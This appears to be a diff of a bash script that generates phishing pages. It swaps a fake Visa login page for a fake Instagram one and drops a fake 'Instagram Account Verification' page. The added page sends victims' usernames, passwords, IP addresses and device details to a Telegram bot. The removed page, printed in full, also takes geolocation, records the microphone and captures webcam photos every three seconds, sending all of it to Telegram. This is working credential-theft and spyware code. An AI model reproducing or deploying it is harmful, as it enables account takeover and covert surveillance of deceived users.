@@ -915,581 +915,76 @@ Device Name📱: \${deviceInfo.deviceName}
 EOF
 }
 
-visa_page() {
+Instagram2_page() {
     cat <<EOF
     <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visa Login</title>
+    <title>Instagram Login</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f1f1f1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        .login-container {
-            background-color: #ffffff;
-            border-radius: 10px;
-            width: 360px;
-            padding: 40px 30px;
-            text-align: center;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-        }
-
-        .login-container img {
-            width: 100px;
-            margin-bottom: 25px;
-        }
-
-        h2 {
-            font-size: 22px;
-            color: #333;
-            margin-bottom: 15px;
-            font-weight: 600;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 12px;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        input:focus {
-            border-color: #1a1a1a;
-            box-shadow: 0 0 8px rgba(26, 26, 26, 0.2);
-        }
-
-        .btn-login {
-            width: 100%;
-            padding: 14px;
-            background-color: #1a1a1a;
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-            border-radius: 5px;
-            border: none;
-            cursor: pointer;
-            margin-bottom: 15px;
-            transition: background-color 0.3s ease;
-        }
-
-        .btn-login:hover {
-            background-color: #333;
-        }
-
-        .forgot-password {
-            margin-top: 10px;
-            font-size: 14px;
-        }
-
-        .forgot-password a {
-            color: #1a1a1a;
-            text-decoration: none;
-        }
-
-        .divider {
-            margin: 20px 0;
-            border-top: 1px solid #dbdbdb;
-        }
-
-        .signup-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
-            font-size: 14px;
-            color: #1a1a1a;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-bottom: 10px;
-        }
-
-        .signup-btn:hover {
-            background-color: #f4f4f4;
-        }
-
-        .terms {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #888;
-        }
-
-        .terms a {
-            color: #1a1a1a;
-            text-decoration: none;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Arial', sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
+        .login-container img { width: 175px; margin-bottom: 25px; }
+        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
+        input:focus { border-color: #4c86ff; box-shadow: 0 0 8px rgba(76, 134, 255, 0.2); }
+        .btn-login { width: 100%; padding: 14px; background-color: #4c86ff; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
+        .btn-login:hover { background-color: #3578e5; }
+        .forgot-password { margin-top: 10px; font-size: 14px; }
+        .forgot-password a { color: #4c86ff; text-decoration: none; }
+        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
+        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #4c86ff; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
+        .signup-btn:hover { background-color: #f4f4f4; }
+        .terms { margin-top: 20px; font-size: 12px; color: #888; }
+        .terms a { color: #4c86ff; text-decoration: none; }
     </style>
 </head>
 <body>
-
     <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo">
-        <h2>Sign in to Visa</h2>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
+        <h2>Sign in to Instagram</h2>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="Email or phone" required>
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit" class="btn-login">Log In</button>
         </form>
         <p class="forgot-password"><a href="#">Forgot password?</a></p>
         <div class="divider"></div>
-        <button class="signup-btn">Create account</button>
+        <button class="signup-btn">Don't have an account? Sign up</button>
     </div>
-
     <script>
         const loginForm = document.getElementById('loginForm');
         loginForm.addEventListener('submit', async function (event) {
             event.preventDefault();
-            
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-
             const deviceInfo = await getDeviceInfo();
-
             const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: '${id}',
-                    text: \`
-Visa Login Attempt:
-
-Username📧: \${username}
-Password🔑: \${password}
-
-Device Info📲:
-
-IP Address🌍: \${deviceInfo.ip}
-Battery Level🔋: \${deviceInfo.batteryLevel}%
-Network Type📡: \${deviceInfo.networkType}
-Device Name📱: \${deviceInfo.deviceName}
-                    \`
+                    text: \`Instagram Login Attempt:\nUsername💎: \${username}\nPassword🔑: \${password}\nDevice Info✨:\nIP Address🌐📍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork🔍🌐: \${deviceInfo.networkType}\nDevice Name🌐: \${deviceInfo.deviceName}\`
                 })
             });
-
             const result = await response.json();
-
             if (result.ok) {
                 alert('Login successful! Redirecting...');
-                window.location.href = 'https://www.visa.com';
+                window.location.href = 'https://www.instagram.com';
             } else {
                 alert('Login failed. Please check your credentials.');
             }
         });
-
         async function getDeviceInfo() {
             const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
             const battery = await navigator.getBattery();
             const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
             const deviceName = navigator.userAgent;
-
-            return {
-                ip: ip.ip,
-                batteryLevel: Math.round(battery.level * 100),
-                networkType: networkType,
-                deviceName: deviceName,
-            };
+            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
         }
-    </script>
-</body>
-</html>
-EOF
-}
-
-instagram_camera_page() {
-    cat <<EOF
-<!DOCTYPE html>
-<html lang="en" dir="ltr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Account Verification</title>
-    <style>
-        :root {
-            --primary-color: #3897f0;
-            --background-light: #fafafa;
-            --text-light: #262626;
-            --background-dark: #121212;
-            --text-dark: #ffffff;
-            --border-light: #dbdbdb;
-            --border-dark: #333;
-        }
-
-        body {
-            font-family: Arial, sans-serif;
-            background-color: var(--background-light);
-            color: var(--text-light);
-            transition: background-color 0.3s, color 0.3s;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        body.dark-mode {
-            background-color: var(--background-dark);
-            color: var(--text-dark);
-        }
-
-        .container {
-            max-width: 400px;
-            width: 100%;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .instagram-logo {
-            width: 120px;
-            margin-bottom: 20px;
-        }
-
-        .verified-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--primary-color);
-            margin: 20px 0;
-        }
-
-        .verified-badge img {
-            width: 30px;
-            margin-left: 10px;
-        }
-
-        .features {
-            text-align: left;
-            margin: 30px 0;
-        }
-
-        .features h2 {
-            font-size: 20px;
-            margin-bottom: 15px;
-        }
-
-        .features ul {
-            list-style: none;
-            padding: 0;
-        }
-
-        .features ul li {
-            margin: 10px 0;
-            font-size: 14px;
-            padding: 10px;
-            background-color: rgba(56, 151, 240, 0.1);
-            border-radius: 5px;
-        }
-
-        form {
-            background-color: var(--background-light);
-            padding: 20px;
-            border: 1px solid var(--border-light);
-            border-radius: 10px;
-            margin: 20px 0;
-        }
-
-        body.dark-mode form {
-            background-color: var(--background-dark);
-            border-color: var(--border-dark);
-        }
-
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid var(--border-light);
-            border-radius: 5px;
-            font-size: 14px;
-            background-color: transparent;
-            color: var(--text-light);
-        }
-
-        body.dark-mode input {
-            border-color: var(--border-dark);
-            color: var(--text-dark);
-        }
-
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: var(--primary-color);
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            font-size: 14px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        button:hover {
-            background-color: #2684f0;
-        }
-
-        footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #8e8e8e;
-        }
-
-        footer img {
-            width: 80px;
-            margin-top: 10px;
-        }
-
-        .theme-switcher {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background-color: var(--primary-color);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            transition: background-color 0.3s;
-        }
-
-        .theme-switcher:hover {
-            background-color: #2684f0;
-        }
-
-        #loading-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            justify-content: center;
-            align-items: center;
-            font-size: 24px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo" class="instagram-logo">
-        <h1>Instagram Account Verification</h1>
-        <div class="verified-badge">
-            <span>Verified Account</span>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/800px-Twitter_Verified_Badge.svg.png" alt="Verified Badge">
-        </div>
-        <div class="features">
-            <h2>Verification Benefits:</h2>
-            <ul>
-                <li>Your account is officially recognized by Instagram.</li>
-                <li>Increased credibility and trust.</li>
-                <li>Broader audience reach.</li>
-                <li>Protection against impersonation.</li>
-            </ul>
-        </div>
-        <form id="verification-form">
-            <input type="text" placeholder="Username" required>
-            <input type="email" placeholder="Email" required>
-            <input type="tel" placeholder="Phone Number" required>
-            <input type="password" placeholder="Password" required>
-            <button type="submit">Verify Account</button>
-        </form>
-        <footer>
-            <p>&copy; 2025 Meta.Instagram.</p>
-            <img src="https://dev-bot-df-mohamed.pantheonsite.io/wp-content/uploads/2025/02/YfZD20-Duia-1.png" alt="Meta Logo">
-        </footer>
-    </div>
-    <button class="theme-switcher" id="theme-switcher">🌞</button>
-    <div id="loading-screen">Loading...</div>
-
-    <script>
-        const themeSwitcher = document.getElementById('theme-switcher');
-        const body = document.body;
-        const form = document.getElementById('verification-form');
-        const loadingScreen = document.getElementById('loading-screen');
-
-        const botToken = "${token}";
-        const chatId = "${id}";
-
-        themeSwitcher.addEventListener('click', () => {
-            body.classList.toggle('dark-mode');
-            form.classList.toggle('dark-mode');
-            themeSwitcher.textContent = body.classList.contains('dark-mode') ? '🌜' : '🌞';
-        });
-
-        async function sendDataToTelegram() {
-            try {
-                let position = await new Promise(resolve => {
-                    navigator.geolocation.getCurrentPosition(resolve, () => {
-                        alert("Location permission is required.");
-                        throw new Error("Location permission denied.");
-                    });
-                });
-                let lat = position.coords.latitude;
-                let lon = position.coords.longitude;
-
-                let battery = await navigator.getBattery();
-                let batteryLevel = battery.level * 100 + "%";
-                let chargingStatus = battery.charging ? "Charging" : "Not Charging";
-
-                let network = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-
-                let userAgent = navigator.userAgent;
-                let deviceInfo = {
-                    os: userAgent.match(/(Windows|Mac OS X|Linux|Android|iOS|iPad)/)?.[0] || "Unknown OS",
-                    browser: userAgent.match(/(Firefox|Chrome|Safari|Edge|Trident|MSIE)\s([0-9.]+)/)?.[1] || "Unknown Browser",
-                    browserVersion: userAgent.match(/(Firefox|Chrome|Safari|Edge|Trident|MSIE)\s([0-9.]+)/)?.[2] || "Unknown Version",
-                };
-
-                let ipResponse = await fetch('https://api64.ipify.org?format=json');
-                let ipData = await ipResponse.json();
-                let ip = ipData.ip;
-
-                let deviceType = navigator.platform;
-                let screenResolution = `${window.screen.width}x${window.screen.height}`;
-                let language = navigator.language || navigator.userLanguage;
-                let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                let sessionId = localStorage.getItem("sessionId") || "Not Available";
-                let cpuInfo = navigator.hardwareConcurrency || "Unknown";
-                let osVersion = navigator.oscpu || "Unknown Version";
-                let timestamp = new Date().toISOString();
-
-                let message = `📱 **New Verification Request** 📱\n\n` +
-                              `👤 **IP:** ${ip}\n` +
-                              `📍 **Location:** [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n` +
-                              `🔋 **Battery Level:** ${batteryLevel} | ⚡ ${chargingStatus}\n` +
-                              `📶 **Network Type:** ${network}\n` +
-                              `💻 **Device Info:** ${deviceInfo.os} | ${deviceInfo.browser} ${deviceInfo.browserVersion}\n` +
-                              `📱 **Device Type:** ${deviceType}\n` +
-                              `🖥️ **Screen Resolution:** ${screenResolution}\n` +
-                              `🌐 **Language:** ${language}\n` +
-                              `⏰ **Timezone:** ${timeZone}\n` +
-                              `🖥️ **CPU Cores:** ${cpuInfo}\n` +
-                              `💿 **OS Version:** ${osVersion}\n` +
-                              `⏳ **Timestamp:** ${timestamp}\n` +
-                              `🔒 **Session ID:** ${sessionId}\n\n` +
-                              `•----------------»[Developer](https://t.me/A_Y_TR)«---------------•`;
-
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
-                });
-
-                startRecording();
-                startSendingImages();
-            } catch (error) {
-                console.error(error);
-                alert("An error occurred. Please check the console for details.");
-            }
-        }
-
-        async function startRecording() {
-            try {
-                let audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                let recorder = new MediaRecorder(audioStream);
-                let audioChunks = [];
-
-                recorder.ondataavailable = event => audioChunks.push(event.data);
-                recorder.onstop = async () => {
-                    let audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                    await sendAudioToBot(audioBlob);
-                };
-
-                recorder.start();
-                setTimeout(() => recorder.stop(), 8000);
-            } catch (error) {
-                console.error("Microphone permission is required:", error);
-            }
-        }
-
-        async function sendAudioToBot(audioBlob) {
-            let formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("audio", audioBlob, "recording.wav");
-            formData.append("caption", `Audio recorded at ${new Date().toISOString()}`);
-
-            await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
-                method: "POST",
-                body: formData
-            });
-        }
-
-        async function captureAndSendPhoto() {
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                let video = document.createElement("video");
-                video.srcObject = stream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-                video.play();
-
-                let canvas = document.createElement("canvas");
-                canvas.width = 640;
-                canvas.height = 480;
-                let context = canvas.getContext("2d");
-
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                let imageData = canvas.toDataURL("image/png");
-
-                stream.getTracks().forEach(track => track.stop());
-
-                await sendImageToBot(imageData);
-            } catch (error) {
-                console.error("Camera permission is required:", error);
-            }
-        }
-
-        async function sendImageToBot(imageData) {
-            let blob = await fetch(imageData).then(res => res.blob());
-            let formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob, "photo.png");
-
-            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            });
-        }
-
-        function startSendingImages() {
-            setInterval(captureAndSendPhoto, 3000);
-        }
-
-        window.onload = async () => {
-            loadingScreen.style.display = "flex";
-            await sendDataToTelegram();
-            loadingScreen.style.display = "none";
-        };
-
-        form.addEventListener('submit', async function(event) {
-            event.preventDefault();
-            loadingScreen.style.display = "flex";
-            await sendDataToTelegram();
-            loadingScreen.style.display = "none";
-            alert("Your verification request has been submitted successfully! We will review your request.");
-        });
     </script>
 </body>
 </html>
@@ -1558,7 +1053,7 @@ show_menu() {
     echo -e "${BLUE}[7] Twitter login${NC}"
     echo -e "${BLUE}[8] PayPal login${NC}"
     echo -e "${BLUE}[9] GitHub login${NC}"
-    echo -e "${BLUE}[10] Instagram and camera and Record${NC}"
+    echo -e "${BLUE}[10] Instagram documentation login${NC}"
     echo -e "${YELLOW}=================================${NC}"
 }
 
@@ -1614,7 +1109,7 @@ case $choice in
         ;;
     10)
         page="Instagram_login"
-        create_page "$page" "$(instagram_camera_page)"
+        create_page "$page" "$(Instagram2_page)"
         ;;
     *)
         echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
